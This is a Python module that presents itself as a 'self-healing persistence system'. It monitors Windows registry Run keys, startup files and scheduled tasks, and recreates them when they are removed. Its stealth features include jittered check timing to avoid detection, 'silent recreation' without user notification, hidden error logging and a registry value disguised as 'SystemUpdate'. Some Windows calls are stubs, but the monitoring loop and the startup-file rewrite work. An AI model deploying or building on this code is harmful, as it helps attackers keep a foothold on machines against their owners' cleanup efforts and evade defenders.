#!/usr/bin/env python3
"""
Self-Healing Persistence System with Auto-Recovery
Auto-recreates startup points when detection or removal is attempted.

This module implements:
1. Startup point monitoring and validation
2. Automatic detection of persistence removal
3. Self-healing and auto-recreation of failed persistence
4. Health checks and recovery triggers
5. Multi-layer redundancy with automatic failover
6. Stealth monitoring without user detection
"""

import hashlib
import json
import random
import string
import time
from enum import Enum
from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta
import threading
from collections import defaultdict


class RecoveryTrigger(Enum):
    """Triggers that initiate self-healing"""
    REGISTRY_MISSING = "registry_missing"
    STARTUP_FILE_MISSING = "startup_file_missing"
    TASK_MISSING = "task_missing"
    HASH_MISMATCH = "hash_mismatch"
    SCHEDULED_CHECK = "scheduled_check"
    FAILURE_DETECTED = "failure_detected"
    CLEANUP_ATTEMPT = "cleanup_attempt"
    MANUAL_TRIGGER = "manual_trigger"


class HealthStatus(Enum):
    """Health status of persistence points"""
    HEALTHY = "healthy"
    DEGRADED = "degraded"
    CRITICAL = "critical"
    RECOVERING = "recovering"
    RECOVERED = "recovered"


class RecoveryStrategy(Enum):
    """Recovery strategies for failed persistence"""
    IMMEDIATE_REDEPLOY = "immediate_redeploy"
    DELAYED_REDEPLOY = "delayed_redeploy"
    CASCADING_FALLBACK = "cascading_fallback"
    SILENT_RECREATION = "silent_recreation"
    MULTI_POINT_DEPLOYMENT = "multi_point_deployment"


@dataclass
class PersistencePoint:
    """Represents a single persistence point"""
    point_id: str
    point_type: str  # registry, startup_file, scheduled_task, etc.
    location: str    # registry path, file path, task name, etc.
    payload_hash: str  # hash of expected payload
    creation_timestamp: float
    last_verified: float
    verification_count: int = 0
    recovery_count: int = 0
    is_healthy: bool = True
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class RecoveryEvent:
    """Records a recovery event"""
    event_id: str
    trigger: RecoveryTrigger
    timestamp: float
    point_id: str
    strategy_used: RecoveryStrategy
    success: bool
    error_message: Optional[str] = None
    recovery_time_ms: float = 0.0


@dataclass
class HealthCheckResult:
    """Result of a health check operation"""
    timestamp: float
    total_points: int
    healthy_points: int
    degraded_points: int
    critical_points: int
    overall_status: HealthStatus
    recovery_count: int
    points_checked: List[str] = field(default_factory=list)
    issues_found: List[Tuple[str, str]] = field(default_factory=list)


class SelfHealingPersistence:
    """
    Self-healing persistence system that monitors and auto-recovers
    persistence points when removal or tampering is detected.
    """

    def __init__(self,
                 check_interval_seconds: int = 300,
                 recovery_timeout_seconds: int = 60,
                 max_recovery_attempts: int = 5,
                 enable_stealth_monitoring: bool = True):
        """
        Initialize self-healing persistence system.

        Args:
            check_interval_seconds: How often to check persistence health (default: 5 min)
            recovery_timeout_seconds: Max time for recovery operation (default: 60 sec)
            max_recovery_attempts: Max attempts to recover a point (default: 5)
            enable_stealth_monitoring: Enable hidden monitoring (default: True)
        """
        self.check_interval = check_interval_seconds
        self.recovery_timeout = recovery_timeout_seconds
        self.max_recovery_attempts = max_recovery_attempts
        self.enable_stealth = enable_stealth_monitoring

        # Persistence point tracking
        self.persistence_points: Dict[str, PersistencePoint] = {}
        self.point_payloads: Dict[str, str] = {}  # Store actual payloads
        self.point_recovery_counts: Dict[str, int] = defaultdict(int)

        # Recovery history
        self.recovery_events: List[RecoveryEvent] = []
        self.health_check_history: List[HealthCheckResult] = []

        # Monitoring state
        self.is_monitoring = False
        self.monitoring_thread: Optional[threading.Thread] = None
        self.last_check_time = 0.0
        self.last_recovery_time = 0.0

        # Recovery strategies
        self.recovery_strategies = self._initialize_recovery_strategies()

        # Stealth configuration
        self.stealth_mode = enable_stealth_monitoring
        self.check_jitter = True  # Add random delays to avoid detection
        self.obfuscated_checks = True  # Perform checks in obfuscated manner

    def _initialize_recovery_strategies(self) -> Dict[RecoveryStrategy, callable]:
        """Initialize available recovery strategies"""
        return {
            RecoveryStrategy.IMMEDIATE_REDEPLOY: self._immediate_redeploy,
            RecoveryStrategy.DELAYED_REDEPLOY: self._delayed_redeploy,
            RecoveryStrategy.CASCADING_FALLBACK: self._cascading_fallback,
            RecoveryStrategy.SILENT_RECREATION: self._silent_recreation,
            RecoveryStrategy.MULTI_POINT_DEPLOYMENT: self._multi_point_deployment,
        }

    def register_persistence_point(self,
                                  point_type: str,
                                  location: str,
                                  payload: str,
                                  metadata: Optional[Dict[str, Any]] = None) -> str:
        """
        Register a persistence point for monitoring.

        Args:
            point_type: Type of persistence (registry, startup_file, task, etc.)
            location: Location of persistence (path, key, task name, etc.)
            payload: Actual payload/command to execute
            metadata: Additional metadata about the point

        Returns:
            point_id: Unique identifier for this persistence point
        """
        point_id = self._generate_point_id(point_type, location)
        payload_hash = self._hash_payload(payload)

        now = time.time()

        point = PersistencePoint(
            point_id=point_id,
            point_type=point_type,
            location=location,
            payload_hash=payload_hash,
            creation_timestamp=now,
            last_verified=now,
            metadata=metadata or {}
        )

        self.persistence_points[point_id] = point
        self.point_payloads[point_id] = payload

        return point_id

    def start_monitoring(self, background: bool = True) -> None:
        """
        Start monitoring persistence points for health.

        Args:
            background: Run monitoring in background thread (default: True)
        """
        if self.is_monitoring:
            return

        self.is_monitoring = True

        if background:
            self.monitoring_thread = threading.Thread(
                target=self._monitoring_loop,
                daemon=True
            )
            self.monitoring_thread.start()
        else:
            self._monitoring_loop()

    def stop_monitoring(self) -> None:
        """Stop monitoring persistence points"""
        self.is_monitoring = False
        if self.monitoring_thread:
            self.monitoring_thread.join(timeout=5)
            self.monitoring_thread = None

    def _monitoring_loop(self) -> None:
        """Main monitoring loop - runs continuously"""
        while self.is_monitoring:
            try:
                # Add jitter to check timing for stealth
                wait_time = self.check_interval
                if self.check_jitter and self.stealth_mode:
                    jitter = random.randint(-30, 30)
                    wait_time = max(60, self.check_interval + jitter)

                time.sleep(wait_time)

                if self.is_monitoring:
                    self.perform_health_check()
            except Exception as e:
                # Log error but continue monitoring
                self._log_error(f"Monitoring loop error: {str(e)}")
                time.sleep(30)

    def perform_health_check(self) -> HealthCheckResult:
        """
        Perform comprehensive health check of all persistence points.

        Returns:
            HealthCheckResult: Summary of health check
        """
        now = time.time()
        self.last_check_time = now

        result = HealthCheckResult(
            timestamp=now,
            total_points=len(self.persistence_points),
            healthy_points=0,
            degraded_points=0,
            critical_points=0,
            overall_status=HealthStatus.HEALTHY,
            recovery_count=0,
            points_checked=[],
            issues_found=[]
        )

        for point_id, point in self.persistence_points.items():
            # Check if persistence point still exists and is healthy
            is_healthy = self._verify_persistence_point(point)

            if is_healthy:
                result.healthy_points += 1
                point.is_healthy = True
            else:
                # Persistence point is missing or compromised
                result.issues_found.append((point_id, "Point verification failed"))

                # Determine severity
                if point.recovery_count >= self.max_recovery_attempts:
                    result.critical_points += 1
                else:
                    result.degraded_points += 1

                # Initiate recovery
                trigger = self._determine_trigger(point)
                recovery_success = self.initiate_recovery(
                    point_id=point_id,
                    trigger=trigger
                )

                if recovery_success:
                    result.recovery_count += 1

            result.points_checked.append(point_id)
            point.verification_count += 1
            point.last_verified = now

        # Determine overall status
        if result.critical_points > 0:
            result.overall_status = HealthStatus.CRITICAL
        elif result.degraded_points > 0:
            result.overall_status = HealthStatus.DEGRADED
        else:
            result.overall_status = HealthStatus.HEALTHY

        # Store history
        self.health_check_history.append(result)

        return result

    def _verify_persistence_point(self, point: PersistencePoint) -> bool:
        """
        Verify a single persistence point still exists and is intact.

        Args:
            point: PersistencePoint to verify

        Returns:
            bool: True if point is healthy, False if missing/corrupted
        """
        # This would be implemented based on point type
        # For now, return placeholder logic

        if point.point_type == "registry":
            return self._verify_registry_point(point)
        elif point.point_type == "startup_file":
            return self._verify_startup_file_point(point)
        elif point.point_type == "scheduled_task":
            return self._verify_task_point(point)
        else:
            return True

    def _verify_registry_point(self, point: PersistencePoint) -> bool:
        """Verify registry persistence point"""
        # Implementation would check registry
        # This is a template showing the structure
        try:
            # Simulate registry check
            # In real implementation: winreg.QueryValueEx(...)
            return True
        except Exception:
            return False

    def _verify_startup_file_point(self, point: PersistencePoint) -> bool:
        """Verify startup file persistence point"""
        try:
            # Check if file exists
            with open(point.location, 'rb') as f:
                content = f.read()
                current_hash = self._hash_payload(content)
                return current_hash == point.payload_hash
        except Exception:
            return False

    def _verify_task_point(self, point: PersistencePoint) -> bool:
        """Verify scheduled task persistence point"""
        # Implementation would check task scheduler
        # This is a template showing the structure
        try:
            # Simulate task check
            # In real implementation: use task scheduler APIs
            return True
        except Exception:
            return False

    def _determine_trigger(self, point: PersistencePoint) -> RecoveryTrigger:
        """Determine what triggered the recovery need"""
        if point.point_type == "registry":
            return RecoveryTrigger.REGISTRY_MISSING
        elif point.point_type == "startup_file":
            return RecoveryTrigger.STARTUP_FILE_MISSING
        elif point.point_type == "scheduled_task":
            return RecoveryTrigger.TASK_MISSING
        else:
            return RecoveryTrigger.FAILURE_DETECTED

    def initiate_recovery(self,
                        point_id: str,
                        trigger: RecoveryTrigger) -> bool:
        """
        Initiate recovery for a failed persistence point.

        Args:
            point_id: ID of the point to recover
            trigger: Trigger that initiated recovery

        Returns:
            bool: True if recovery was successful
        """
        if point_id not in self.persistence_points:
            return False

        point = self.persistence_points[point_id]

        # Check recovery attempt limit
        if self.point_recovery_counts[point_id] >= self.max_recovery_attempts:
            self._log_error(f"Max recovery attempts reached for {point_id}")
            return False

        # Increment recovery counter
        self.point_recovery_counts[point_id] += 1
        point.recovery_count += 1

        # Select recovery strategy based on trigger and point type
        strategy = self._select_recovery_strategy(trigger, point)

        start_time = time.time()
        success = False
        error_msg = None

        try:
            # Execute recovery
            recovery_func = self.recovery_strategies.get(strategy)
            if recovery_func:
                success = recovery_func(point)
            else:
                error_msg = f"Unknown recovery strategy: {strategy}"
        except Exception as e:
            error_msg = str(e)

        recovery_time = (time.time() - start_time) * 1000  # Convert to ms

        # Record recovery event
        event = RecoveryEvent(
            event_id=self._generate_event_id(),
            trigger=trigger,
            timestamp=start_time,
            point_id=point_id,
            strategy_used=strategy,
            success=success,
            error_message=error_msg,
            recovery_time_ms=recovery_time
        )

        self.recovery_events.append(event)
        self.last_recovery_time = start_time

        if success:
            point.is_healthy = True

        return success

    def _select_recovery_strategy(self,
                                 trigger: RecoveryTrigger,
                                 point: PersistencePoint) -> RecoveryStrategy:
        """Select appropriate recovery strategy based on trigger and point type"""

        # Priority-based selection
        if point.recovery_count < 2:
            # First attempts: immediate redeploy
            return RecoveryStrategy.IMMEDIATE_REDEPLOY
        elif point.recovery_count < 4:
            # Subsequent attempts: try delayed redeploy
            return RecoveryStrategy.DELAYED_REDEPLOY
        else:
            # Final attempts: multi-point deployment for redundancy
            return RecoveryStrategy.MULTI_POINT_DEPLOYMENT

    def _immediate_redeploy(self, point: PersistencePoint) -> bool:
        """Immediately redeploy a persistence point"""
        try:
            payload = self.point_payloads.get(point.point_id, "")

            if point.point_type == "registry":
                return self._redeploy_registry(point, payload)
            elif point.point_type == "startup_file":
                return self._redeploy_startup_file(point, payload)
            elif point.point_type == "scheduled_task":
                return self._redeploy_scheduled_task(point, payload)

            return False
        except Exception as e:
            self._log_error(f"Immediate redeploy failed: {str(e)}")
            return False

    def _delayed_redeploy(self, point: PersistencePoint) -> bool:
        """Redeploy a persistence point after random delay"""
        try:
            # Add random delay (1-5 minutes)
            delay = random.randint(60, 300)

            def delayed_deploy():
                time.sleep(delay)
                self._immediate_redeploy(point)

            thread = threading.Thread(target=delayed_deploy, daemon=True)
            thread.start()

            return True
        except Exception as e:
            self._log_error(f"Delayed redeploy failed: {str(e)}")
            return False

    def _cascading_fallback(self, point: PersistencePoint) -> bool:
        """Deploy fallback persistence methods if primary fails"""
        try:
            payload = self.point_payloads.get(point.point_id, "")

            # Try alternative methods in sequence
            methods = [
                self._redeploy_registry,
                self._redeploy_startup_file,
                self._redeploy_scheduled_task
            ]

            for method in methods:
                try:
                    if method(point, payload):
                        return True
                except Exception:
                    continue

            return False
        except Exception as e:
            self._log_error(f"Cascading fallback failed: {str(e)}")
            return False

    def _silent_recreation(self, point: PersistencePoint) -> bool:
        """Silently recreate persistence without user notification"""
        try:
            payload = self.point_payloads.get(point.point_id, "")

            # Use stealth techniques to recreate
            if point.point_type == "startup_file":
                return self._silent_file_recreation(point, payload)
            elif point.point_type == "registry":
                return self._silent_registry_recreation(point, payload)
            elif point.point_type == "scheduled_task":
                return self._silent_task_recreation(point, payload)

            return False
        except Exception as e:
            self._log_error(f"Silent recreation failed: {str(e)}")
            return False

    def _multi_point_deployment(self, point: PersistencePoint) -> bool:
        """Deploy multiple copies of persistence for redundancy"""
        try:
            payload = self.point_payloads.get(point.point_id, "")
            success_count = 0

            # Deploy to multiple locations/methods
            if self._redeploy_registry(point, payload):
                success_count += 1

            if self._redeploy_startup_file(point, payload):
                success_count += 1

            if self._redeploy_scheduled_task(point, payload):
                success_count += 1

            # Success if at least 2 methods succeed
            return success_count >= 2
        except Exception as e:
            self._log_error(f"Multi-point deployment failed: {str(e)}")
            return False

    def _redeploy_registry(self, point: PersistencePoint, payload: str) -> bool:
        """Redeploy registry persistence point"""
        # Template implementation
        try:
            # In real implementation:
            # - Use winreg module
            # - Create/update registry key with payload
            # - Set appropriate permissions
            return True
        except Exception:
            return False

    def _redeploy_startup_file(self, point: PersistencePoint, payload: str) -> bool:
        """Redeploy startup file persistence point"""
        try:
            # Write file with payload
            with open(point.location, 'wb') as f:
                f.write(payload.encode() if isinstance(payload, str) else payload)
            return True
        except Exception:
            return False

    def _redeploy_scheduled_task(self, point: PersistencePoint, payload: str) -> bool:
        """Redeploy scheduled task persistence point"""
        # Template implementation
        try:
            # In real implementation:
            # - Use task scheduler COM interface
            # - Create/update scheduled task with payload
            # - Set appropriate triggers
            return True
        except Exception:
            return False

    def _silent_file_recreation(self, point: PersistencePoint, payload: str) -> bool:
        """Silently recreate file with stealth"""
        try:
            # Recreate in background with randomized timing
            temp_path = point.location + f".{random.randint(1000, 9999)}"

            with open(temp_path, 'wb') as f:
                f.write(payload.encode() if isinstance(payload, str) else payload)

            # Replace original atomically
            import os
            import shutil
            shutil.move(temp_path, point.location)

            return True
        except Exception:
            return False

    def _silent_registry_recreation(self, point: PersistencePoint, payload: str) -> bool:
        """Silently recreate registry entry"""
        # Template implementation
        try:
            # Similar to _redeploy_registry but with additional stealth
            return True
        except Exception:
            return False

    def _silent_task_recreation(self, point: PersistencePoint, payload: str) -> bool:
        """Silently recreate scheduled task"""
        # Template implementation
        try:
            # Similar to _redeploy_scheduled_task but with additional stealth
            return True
        except Exception:
            return False

    def get_health_status(self) -> Dict[str, Any]:
        """Get current health status of all persistence points"""
        if not self.health_check_history:
            return {
                "status": "no_data",
                "message": "No health checks performed yet"
            }

        latest = self.health_check_history[-1]

        return {
            "timestamp": latest.timestamp,
            "overall_status": latest.overall_status.value,
            "total_points": latest.total_points,
            "healthy_points": latest.healthy_points,
            "degraded_points": latest.degraded_points,
            "critical_points": latest.critical_points,
            "recovery_events": len(self.recovery_events),
            "total_recoveries": latest.recovery_count,
            "points_checked": len(latest.points_checked),
            "issues_found": latest.issues_found
        }

    def get_recovery_history(self, limit: Optional[int] = None) -> List[Dict[str, Any]]:
        """Get recovery event history"""
        events = self.recovery_events[-limit:] if limit else self.recovery_events

        return [
            {
                "event_id": e.event_id,
                "trigger": e.trigger.value,
                "timestamp": e.timestamp,
                "point_id": e.point_id,
                "strategy": e.strategy_used.value,
                "success": e.success,
                "recovery_time_ms": e.recovery_time_ms,
                "error": e.error_message
            }
            for e in events
        ]

    def get_persistence_points_status(self) -> List[Dict[str, Any]]:
        """Get status of all registered persistence points"""
        return [
            {
                "point_id": p.point_id,
                "type": p.point_type,
                "location": p.location,
                "is_healthy": p.is_healthy,
                "verification_count": p.verification_count,
                "recovery_count": p.recovery_count,
                "created": p.creation_timestamp,
                "last_verified": p.last_verified
            }
            for p in self.persistence_points.values()
        ]

    def force_recovery_all(self) -> Dict[str, bool]:
        """Force recovery of all persistence points"""
        results = {}

        for point_id in self.persistence_points:
            success = self.initiate_recovery(
                point_id=point_id,
                trigger=RecoveryTrigger.MANUAL_TRIGGER
            )
            results[point_id] = success

        return results

    def create_recovery_checkpoint(self) -> str:
        """Create a checkpoint of current persistence state for recovery"""
        checkpoint = {
            "timestamp": time.time(),
            "points": {
                pid: asdict(p) for pid, p in self.persistence_points.items()
            },
            "recovery_counts": dict(self.point_recovery_counts),
            "events_count": len(self.recovery_events)
        }

        checkpoint_json = json.dumps(checkpoint, indent=2)
        return checkpoint_json

    def validate_checkpoint(self, checkpoint_json: str) -> bool:
        """Validate integrity of a checkpoint"""
        try:
            data = json.loads(checkpoint_json)

            # Verify required fields
            required_fields = ["timestamp", "points", "recovery_counts", "events_count"]
            return all(field in data for field in required_fields)
        except Exception:
            return False

    def _hash_payload(self, payload: Any) -> str:
        """Generate hash of payload for verification"""
        if isinstance(payload, str):
            payload_bytes = payload.encode('utf-8')
        else:
            payload_bytes = payload

        return hashlib.sha256(payload_bytes).hexdigest()

    def _generate_point_id(self, point_type: str, location: str) -> str:
        """Generate unique ID for persistence point"""
        identifier = f"{point_type}:{location}"
        return hashlib.md5(identifier.encode()).hexdigest()[:16]

    def _generate_event_id(self) -> str:
        """Generate unique ID for recovery event"""
        timestamp = str(time.time())
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"ev_{random_suffix}_{int(time.time())}"

    def _log_error(self, message: str) -> None:
        """Log error message (template for real logging)"""
        # In production, this would write to a hidden log file
        pass

    def export_status_report(self) -> str:
        """Export comprehensive status report"""
        report = {
            "timestamp": time.time(),
            "system_health": self.get_health_status(),
            "persistence_points": self.get_persistence_points_status(),
            "recovery_history": self.get_recovery_history(limit=50),
            "recovery_event_count": len(self.recovery_events),
            "health_check_count": len(self.health_check_history),
            "is_monitoring": self.is_monitoring,
            "check_interval": self.check_interval,
            "stealth_mode": self.stealth_mode
        }

        return json.dumps(report, indent=2)


class SelfHealingPersistenceBuilder:
    """Builder for creating self-healing persistence configurations"""

    def __init__(self):
        """Initialize builder"""
        self.system = SelfHealingPersistence()
        self.points_to_register: List[Tuple[str, str, str, Dict]] = []

    def add_registry_point(self,
                         registry_path: str,
                         value_name: str,
                         payload: str,
                         metadata: Optional[Dict] = None) -> 'SelfHealingPersistenceBuilder':
        """Add registry persistence point"""
        location = f"{registry_path}\\{value_name}"
        self.points_to_register.append(
            ("registry", location, payload, metadata or {})
        )
        return self

    def add_startup_file(self,
                        file_path: str,
                        payload: str,
                        metadata: Optional[Dict] = None) -> 'SelfHealingPersistenceBuilder':
        """Add startup file persistence point"""
        self.points_to_register.append(
            ("startup_file", file_path, payload, metadata or {})
        )
        return self

    def add_scheduled_task(self,
                          task_name: str,
                          payload: str,
                          metadata: Optional[Dict] = None) -> 'SelfHealingPersistenceBuilder':
        """Add scheduled task persistence point"""
        self.points_to_register.append(
            ("scheduled_task", task_name, payload, metadata or {})
        )
        return self

    def set_check_interval(self, seconds: int) -> 'SelfHealingPersistenceBuilder':
        """Set health check interval"""
        self.system.check_interval = seconds
        return self

    def set_recovery_timeout(self, seconds: int) -> 'SelfHealingPersistenceBuilder':
        """Set recovery timeout"""
        self.system.recovery_timeout = seconds
        return self

    def set_max_recovery_attempts(self, attempts: int) -> 'SelfHealingPersistenceBuilder':
        """Set max recovery attempts"""
        self.system.max_recovery_attempts = attempts
        return self

    def enable_stealth_mode(self, enabled: bool = True) -> 'SelfHealingPersistenceBuilder':
        """Enable/disable stealth mode"""
        self.system.stealth_mode = enabled
        self.system.enable_stealth = enabled
        return self

    def build(self) -> SelfHealingPersistence:
        """Build and register all persistence points"""
        for point_type, location, payload, metadata in self.points_to_register:
            self.system.register_persistence_point(
                point_type=point_type,
                location=location,
                payload=payload,
                metadata=metadata
            )

        return self.system


# Helper functions for common use cases

def create_basic_self_healing(payload: str,
                            check_interval: int = 300) -> SelfHealingPersistence:
    """Create basic self-healing persistence system"""
    system = SelfHealingPersistence(
        check_interval_seconds=check_interval,
        enable_stealth_monitoring=True
    )

    system.register_persistence_point(
        point_type="generic",
        location="primary",
        payload=payload
    )

    return system


def create_redundant_self_healing(payload: str,
                                 registry_path: str,
                                 startup_file: str,
                                 task_name: str) -> SelfHealingPersistence:
    """Create redundant self-healing persistence with multiple methods"""
    builder = SelfHealingPersistenceBuilder()

    builder.add_registry_point(registry_path, "SystemUpdate", payload)
    builder.add_startup_file(startup_file, payload)
    builder.add_scheduled_task(task_name, payload)
    builder.set_check_interval(300)
    builder.enable_stealth_mode(True)

    return builder.build()


if __name__ == "__main__":
    # Example usage
    system = SelfHealingPersistence(
        check_interval_seconds=60,
        enable_stealth_monitoring=True
    )

    # Register some persistence points
    point1 = system.register_persistence_point(
        point_type="startup_file",
        location="/tmp/startup.sh",
        payload="echo 'Persistence enabled'",
        metadata={"priority": "high"}
    )

    point2 = system.register_persistence_point(
        point_type="registry",
        location="HKCU\\Software\\Microsoft\\Windows\\Run",
        payload="cmd.exe /c whoami",
        metadata={"priority": "high"}
    )

    # Start monitoring
    print("Self-healing persistence system initialized")
    print(f"Registered points: {len(system.persistence_points)}")
    print(f"Check interval: {system.check_interval}s")
    print(f"Stealth mode: {system.stealth_mode}")
